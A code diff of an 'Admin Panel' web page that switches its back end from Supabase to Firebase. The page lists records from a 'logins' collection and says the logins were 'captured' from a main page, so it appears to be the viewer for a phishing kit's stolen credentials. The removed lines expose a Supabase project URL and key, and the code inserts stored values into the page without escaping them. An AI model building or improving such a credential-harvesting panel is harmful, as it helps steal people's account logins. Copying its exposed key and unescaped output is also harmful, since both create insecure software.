@@ -5,25 +5,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Panel</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      background:#f2f3f5; 
-      padding:20px; 
+    body {
+      font-family: Arial, sans-serif;
+      background:#f2f3f5;
+      padding:20px;
       margin: 0;
     }
-    .card { 
-      background:white; 
-      padding:18px; 
-      margin:12px 0; 
-      border-radius:10px; 
-      box-shadow:0 4px 12px rgba(0,0,0,0.1); 
+    .card {
+      background:white;
+      padding:18px;
+      margin:12px 0;
+      border-radius:10px;
+      box-shadow:0 4px 12px rgba(0,0,0,0.1);
     }
-    button { 
-      padding:12px 24px; 
-      background:#0064e0; 
-      color:white; 
-      border:none; 
-      border-radius:8px; 
+    button {
+      padding:12px 24px;
+      background:#0064e0;
+      color:white;
+      border:none;
+      border-radius:8px;
       cursor:pointer;
       font-size: 16px;
     }
@@ -36,51 +36,43 @@
   <button onclick="loadLogins()">🔄 Refresh</button>
   <div id="list"></div>
 
-  <!-- Supabase CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
 
   <script>
-    const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Full key here
+    // ================== FIREBASE CONFIG ==================
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY_HERE",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "XXXXXXXXXX",
+      appId: "YOUR_APP_ID"
+    };
 
-    let supabaseClient;
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-    async function initSupabase() {
-      try {
-        const { createClient } = supabase;
-        supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        console.log("✅ Supabase initialized");
-        loadLogins();
-      } catch (e) {
-        console.error(e);
-        document.getElementById('list').innerHTML = `<p class="error">Supabase initialization failed. Check console (F12).</p>`;
-      }
-    }
-
+    // ================== LOAD LOGINS (Firebase) ==================
     async function loadLogins() {
       const list = document.getElementById('list');
       list.innerHTML = "<p>Loading data...</p>";
 
-      if (!supabaseClient) {
-        list.innerHTML = `<p class="error">Supabase not initialized yet.</p>`;
-        return;
-      }
-
       try {
-        const { data, error } = await supabaseClient
-          .from('logins')
-          .select('*')
-          .order('timestamp', { ascending: false });
+        const snapshot = await db.collection('logins')
+          .orderBy('timestamp', 'desc')
+          .get();
 
-        if (error) throw error;
-
-        if (!data || data.length === 0) {
+        if (snapshot.empty) {
           list.innerHTML = "<p>No logins captured yet. Try submitting from main page.</p>";
           return;
         }
 
         let html = '';
-        data.forEach(item => {
+        snapshot.forEach(doc => {
+          const item = doc.data();
           html += `
             <div class="card">
               <strong>Username:</strong> ${item.username}<br>
@@ -95,8 +87,8 @@
       }
     }
 
-    // Initialize when page loads
-    window.onload = initSupabase;
+    // Load data when page opens
+    window.onload = loadLogins;
   </script>
 </body>
 </html>
